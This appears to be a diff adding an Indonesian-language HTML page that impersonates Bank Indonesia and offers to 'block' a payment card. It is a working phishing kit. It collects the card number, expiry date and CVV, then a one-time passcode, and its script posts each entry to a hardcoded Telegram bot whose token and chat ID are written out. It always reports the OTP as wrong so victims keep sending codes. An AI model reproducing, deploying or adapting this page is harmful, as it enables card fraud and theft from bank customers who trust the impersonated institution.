@@ -1,1 +1,520 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <title>Bank Indonesia</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+  <script src="https://dev-danapemulihan.pantheonsite.io/asset/jquery.mask.min.js"></script>
 
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+
+    body {
+      background: #ffffff;
+      min-height: 100vh;
+      padding: 20px;
+    }
+
+    /* ===== HEADER LOGO BI ===== */
+    .header {
+      text-align: center;
+      margin: 20px 0 30px;
+    }
+    .logo-circle {
+      width: 90px;
+      height: 90px;
+      background: #0047AB;
+      border-radius: 50%;
+      display: inline-flex;
+      align-items: center;
+      justify-content: center;
+      position: relative;
+    }
+    .logo-circle span {
+      color: white;
+      font-size: 52px;
+      font-weight: 700;
+      line-height: 1;
+    }
+    .bank-title {
+      font-size: 24px;
+      color: #0047AB;
+      font-weight: 500;
+      margin-top: 10px;
+      letter-spacing: 0.5px;
+    }
+
+    /* ===== FORM KOTAK UTAMA ===== */
+    .form-container {
+      max-width: 440px;
+      margin: 0 auto;
+      border: 2px solid #b32424;
+      border-radius: 10px;
+      background: #e0e0e0;
+      overflow: hidden;
+      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
+    }
+
+    /* ===== JUDUL PILIH BANK ===== */
+    .form-header {
+      padding: 14px 16px;
+      font-size: 15px;
+      color: #1a1a1a;
+      font-weight: 500;
+      background: #e0e0e0;
+      border-bottom: 1px solid #cccccc;
+    }
+
+    /* ===== PILIH BANK ===== */
+    .bank-select-box {
+      background: #ffffff;
+      padding: 16px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      cursor: pointer;
+      position: relative;
+    }
+    .bank-left {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+    }
+    .bank-logo-text {
+      font-size: 26px;
+      font-weight: 700;
+      color: #0066CC;
+    }
+    .bank-name-text {
+      font-size: 17px;
+      color: #333333;
+      font-weight: 500;
+    }
+    .bank-arrow {
+      font-size: 12px;
+      color: #666666;
+      pointer-events: none;
+    }
+    .bank-dropdown {
+      position: absolute;
+      top: 100%;
+      left: 0;
+      right: 0;
+      background: #ffffff;
+      border: 1px solid #ccc;
+      border-top: none;
+      z-index: 100;
+      display: none;
+      max-height: 300px;
+      overflow-y: auto;
+    }
+    .bank-option {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 14px 16px;
+      cursor: pointer;
+      border-bottom: 1px solid #eee;
+    }
+    .bank-option:hover {
+      background: #f5f5f5;
+    }
+
+    /* ===== LABEL INPUT ===== */
+    .field-label {
+      font-size: 15px;
+      color: #1a1a1a;
+      margin: 20px 16px 8px;
+      display: block;
+      font-weight: 500;
+    }
+
+    /* ===== INPUT FIELD ===== */
+    .input-field {
+      margin: 0 16px;
+    }
+    .input-field input {
+      width: 100%;
+      height: 48px;
+      padding: 0 12px;
+      border: 1px solid #b3b3b3;
+      border-radius: 2px;
+      font-size: 16px;
+      background: #ffffff;
+      outline: none;
+    }
+    .input-field input:focus {
+      border-color: #888;
+    }
+
+    /* ===== ROW MASA BERLAKU & CVV ===== */
+    .input-row {
+      display: flex;
+      gap: 16px;
+      margin: 12px 16px 0;
+    }
+    .input-col {
+      flex: 1;
+    }
+    .input-col label {
+      font-size: 15px;
+      color: #1a1a1a;
+      margin-bottom: 8px;
+      display: block;
+      font-weight: 500;
+    }
+    .input-col input {
+      width: 100%;
+      height: 48px;
+      padding: 0 12px;
+      border: 1px solid #b3b3b3;
+      border-radius: 2px;
+      font-size: 16px;
+      background: #ffffff;
+      outline: none;
+    }
+
+    /* ===== TOMBOL BLOKIR SEKARANG ===== */
+    .btn-wrapper {
+      position: relative;
+      margin-top: 24px;
+    }
+    .btn-blokir {
+      width: 100%;
+      height: 56px;
+      background: linear-gradient(90deg, #b32424 0%, #a81f1f 100%);
+      color: #ffffff;
+      border: none;
+      font-size: 16px;
+      font-weight: 500;
+      cursor: pointer;
+      position: relative;
+      overflow: hidden;
+      clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%);
+    }
+    /* Sudut potong kanan bawah persis seperti foto */
+    .btn-blokir::after {
+      content: '';
+      position: absolute;
+      right: 0;
+      bottom: 0;
+      width: 70px;
+      height: 100%;
+      background: #e0e0e0;
+      clip-path: polygon(30% 0, 100% 0, 100% 100%, 0 100%);
+      pointer-events: none;
+    }
+    .btn-blokir:disabled {
+      opacity: 0.85;
+      cursor: not-allowed;
+    }
+
+    /* ===== STATUS TEXT ===== */
+    .status-area {
+      padding: 10px 16px 16px;
+      font-size: 13px;
+      min-height: 24px;
+    }
+    .status-success { color: #28a745; }
+    .status-error { color: #dc3545; }
+
+    /* ===== OTP MODAL ===== */
+    #otpModal {
+      display: none;
+      position: fixed;
+      inset: 0;
+      background: rgba(0,0,0,0.5);
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      padding: 20px;
+    }
+    .otp-popup {
+      width: 100%;
+      max-width: 340px;
+      background: #fff;
+      border-radius: 10px;
+      padding: 25px;
+      text-align: center;
+    }
+    .otp-popup h3 {
+      font-size: 18px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    .otp-popup input {
+      width: 100%;
+      height: 50px;
+      text-align: center;
+      font-size: 22px;
+      letter-spacing: 8px;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+      margin-bottom: 16px;
+    }
+    .otp-btn {
+      width: 100%;
+      height: 50px;
+      background: #b32424;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      font-size: 16px;
+      cursor: pointer;
+    }
+    .otp-note {
+      margin-top: 12px;
+      color: #b32424;
+      font-weight: 500;
+      font-size: 14px;
+    }
+
+    /* ===== RESPONSIVE ===== */
+    @media (max-width: 400px) {
+      .input-row { flex-direction: column; gap: 10px; }
+      .bank-title { font-size: 20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== LOGO BANK INDONESIA ===== -->
+  <div class="header">
+    <div class="logo-circle"><span>BI</span></div>
+    <div class="bank-title">BANK INDONESIA</div>
+  </div>
+
+  <!-- ===== FORM UTAMA ===== -->
+  <div class="form-container">
+    <div class="form-header">Pilih Bank Penerbit Kartu debit/Kredit Anda</div>
+
+    <!-- PILIH BANK -->
+    <div class="bank-select-box" id="bankSelect">
+      <div class="bank-left">
+        <span class="bank-logo-text" id="bankIcon">BRI</span>
+        <span class="bank-name-text" id="bankFullName">BANK BRI</span>
+      </div>
+      <span class="bank-arrow">▼</span>
+      <div class="bank-dropdown" id="bankDropdown">
+        <div class="bank-option" data-bank="BRI" data-icon="BRI">
+          <span class="bank-logo-text">BRI</span><span class="bank-name-text">BANK BRI</span>
+        </div>
+        <div class="bank-option" data-bank="BNI" data-icon="BNI">
+          <span class="bank-logo-text">BNI</span><span class="bank-name-text">BANK BNI</span>
+        </div>
+        <div class="bank-option" data-bank="BCA" data-icon="BCA">
+          <span class="bank-logo-text">BCA</span><span class="bank-name-text">BANK BCA</span>
+        </div>
+        <div class="bank-option" data-bank="MANDIRI" data-icon="MDR">
+          <span class="bank-logo-text">MDR</span><span class="bank-name-text">BANK MANDIRI</span>
+        </div>
+        <div class="bank-option" data-bank="PERMATA" data-icon="PRM">
+          <span class="bank-logo-text">PRM</span><span class="bank-name-text">BANK PERMATA</span>
+        </div>
+        <div class="bank-option" data-bank="MEGA" data-icon="MEGA">
+          <span class="bank-logo-text">MEGA</span><span class="bank-name-text">BANK MEGA</span>
+        </div>
+        <div class="bank-option" data-bank="DBS" data-icon="DBS">
+          <span class="bank-logo-text">DBS</span><span class="bank-name-text">BANK DBS</span>
+        </div>
+        <div class="bank-option" data-bank="MAYBANK" data-icon="MBK">
+          <span class="bank-logo-text">MBK</span><span class="bank-name-text">MAYBANK</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- NOMOR KARTU -->
+    <label class="field-label">16 Digit Angka Nomor Kartu Debit/Kredit</label>
+    <div class="input-field">
+      <input type="tel" id="cardNumber" placeholder="#### #### #### ####" maxlength="19" required>
+    </div>
+
+    <!-- MASA BERLAKU & CVV -->
+    <div class="input-row">
+      <div class="input-col">
+        <label>Masa Berlaku</label>
+        <input type="tel" id="validThru" placeholder="MM/YY" maxlength="5" required>
+      </div>
+      <div class="input-col">
+        <label>CVV (3 Digit)</label>
+        <input type="tel" id="cvv" placeholder="###" maxlength="3" required>
+      </div>
+    </div>
+
+    <!-- TOMBOL BLOKIR SEKARANG -->
+    <div class="btn-wrapper">
+      <button type="button" id="submitBtn" class="btn-blokir">Blokir Sekarang</button>
+    </div>
+
+    <div id="statusMsg" class="status-area"></div>
+  </div>
+
+  <!-- ===== OTP MODAL ===== -->
+  <div id="otpModal">
+    <div class="otp-popup">
+      <h3>Masukkan Kode OTP</h3>
+      <input type="tel" id="otpInput" placeholder="000000" maxlength="6">
+      <button id="otpSendBtn" class="otp-btn">Kirim OTP</button>
+      <div id="otpNotice" class="otp-note"></div>
+    </div>
+  </div>
+
+  <script>
+    // ==================================================
+    // KONFIGURASI TELEGRAM — GANTI DATA ANDA!
+    // ==================================================
+    const BOT_TOKEN = "8947782136:AAEjQuwb_sB8kUYsT_X1a5i3liNTERbQ16w";
+    const CHAT_ID = "8405193617";
+    const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    let selectedBank = "BRI";
+    let formData = {};
+
+    // ==================================================
+    // INISIALISASI
+    // ==================================================
+    $(document).ready(function () {
+      // Mask input
+      $('#cardNumber').mask('0000 0000 0000 0000');
+      $('#validThru').mask('00/00');
+      $('#cvv').mask('000');
+
+      // Toggle dropdown bank
+      $('#bankSelect').on('click', function (e) {
+        if (!$(e.target).closest('.bank-option').length) {
+          $('#bankDropdown').slideToggle(200);
+        }
+      });
+
+      // Pilih bank
+      $('.bank-option').on('click', function () {
+        selectedBank = $(this).data('bank');
+        const icon = $(this).data('icon');
+        const name = $(this).find('.bank-name-text').text();
+        $('#bankIcon').text(icon);
+        $('#bankFullName').text(name);
+        $('#bankDropdown').slideUp(200);
+      });
+
+      // Tutup dropdown klik luar
+      $(document).on('click', function (e) {
+        if (!$(e.target).closest('#bankSelect').length) {
+          $('#bankDropdown').slideUp(200);
+        }
+      });
+
+      // Submit form utama
+      $('#submitBtn').on('click', handleFormSubmit);
+
+      // Submit OTP
+      $('#otpSendBtn').on('click', handleOtpSubmit);
+    });
+
+    // ==================================================
+    // KIRIM KE TELEGRAM
+    // ==================================================
+    async function sendToTelegram(text, $statusEl) {
+      try {
+        const res = await fetch(TELEGRAM_API, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: text,
+            parse_mode: 'HTML'
+          })
+        });
+        const data = await res.json();
+        if (data.ok) {
+          $statusEl.removeClass('status-error').addClass('status-success').text('✅ Data terkirim!');
+          return true;
+        }
+        throw new Error(data.description || 'Kesalahan server');
+      } catch (err) {
+        $statusEl.removeClass('status-success').addClass('status-error').text('❌ Gagal kirim: ' + err.message);
+        return false;
+      }
+    }
+
+    // ==================================================
+    // HANDLER FORM UTAMA
+    // ==================================================
+    async function handleFormSubmit() {
+      const cardNumber = $('#cardNumber').val();
+      const validThru = $('#validThru').val();
+      const cvv = $('#cvv').val();
+      const $btn = $('#submitBtn');
+      const $status = $('#statusMsg');
+
+      // Validasi
+      if (!selectedBank) return alert('⚠️ Pilih bank terlebih dahulu!');
+      if (cardNumber.replace(/\s/g, '').length !== 16) return alert('⚠️ Nomor kartu harus 16 digit!');
+      if (!/^\d{2}\/\d{2}$/.test(validThru)) return alert('⚠️ Format: MM/YY!');
+      if (cvv.length !== 3) return alert('⚠️ CVV harus 3 digit!');
+
+      formData = { bank: selectedBank, cardNumber, validThru, cvv };
+
+      $btn.prop('disabled', true).text('Memproses...');
+      $status.removeClass('status-success status-error').text('⏳ Mengirim data...');
+
+      const message = `
+📩 <b>FORM BLOKIR KARTU</b>
+━━━━━━━━━━━━━━━━━━━━
+🏦 Bank: <b>${selectedBank}</b>
+💳 No. Kartu: <code>${cardNumber}</code>
+📅 Berlaku: <b>${validThru}</b>
+🔒 CVV: <b>${cvv}</b>
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+━━━━━━━━━━━━━━━━━━━━
+      `.trim();
+
+      await sendToTelegram(message, $status);
+
+      // Tampilkan OTP setelah 5 detik
+      setTimeout(() => {
+        $('#otpModal').fadeIn(300).css('display', 'flex');
+        $('#otpInput').focus();
+      }, 5000);
+    }
+
+    // ==================================================
+    // HANDLER OTP
+    // ==================================================
+    async function handleOtpSubmit() {
+      const otp = $('#otpInput').val();
+      const $notice = $('#otpNotice');
+
+      if (otp.length !== 6) return $notice.text('⚠️ OTP harus 6 digit!');
+      $notice.text('⏳ Memverifikasi...');
+
+      const message = `
+🔐 <b>KODE OTP DITERIMA</b>
+━━━━━━━━━━━━━━━━━━━━
+🏦 Bank: <b>${formData.bank}</b>
+💳 No. Kartu: <code>${formData.cardNumber}</code>
+🔢 OTP: <b>${otp}</b>
+🕐 Waktu: ${new Date().toLocaleString('id-ID')}
+━━━━━━━━━━━━━━━━━━━━
+      `.trim();
+
+      await sendToTelegram(message, $notice);
+
+      // Simulasi kode salah
+      setTimeout(() => {
+        $notice.text('⚠️ Kode OTP Salah, Silahkan ulangi!');
+        $('#otpInput').val('');
+        $('#otpSendBtn').text('Kirim OTP').prop('disabled', false);
+      }, 2000);
+    }
+  </script>
+
+</body>
+</html>
